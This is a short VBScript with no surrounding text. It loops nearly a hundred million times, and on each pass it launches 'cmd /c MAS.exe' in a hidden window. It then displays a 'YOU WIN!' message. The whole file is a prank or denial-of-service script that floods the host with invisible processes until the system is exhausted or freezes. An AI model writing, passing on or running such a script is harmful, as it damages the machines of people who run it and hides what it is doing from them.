For count = 1 To 99999999
	Set ws = CreateObject("Wscript.Shell")
	ws.run "cmd /c MAS.exe", vbhide
Next
	Msgbox "YOU WIN!"
